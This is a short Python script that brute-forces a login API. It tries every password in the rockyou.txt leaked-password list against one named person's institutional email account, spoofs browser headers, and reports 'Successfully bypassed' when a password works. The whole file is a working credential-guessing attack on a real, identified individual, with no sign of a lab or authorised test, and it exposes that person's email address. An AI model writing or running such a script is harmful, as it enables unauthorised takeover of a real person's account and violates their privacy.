import requests
from dotenv import load_dotenv
import os

load_dotenv()

url = os.getenv("API_URL")
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}

with open("./rockyou.txt", "r", encoding="latin-1") as passwords:
    passwds = passwords.readlines()

i = 0
for passwd in passwds:
    passwd = passwd.strip()
    res = requests.post(url, data={"username": "sandhyaranicse@anurag.edu.in", "password": passwd, "deviceType": "browser", "clientName": "Chrome", "os": "Windows", "osVersion": "10.0", "tokenType": "WEB"}, headers=headers)
    res_json = res.json()
    
    if res_json["message"] != "Invalid password":
        print("Successfully bypassed with", passwd)
        exit(0)
    else:
        print(i, ":", res_json)
        i += 1
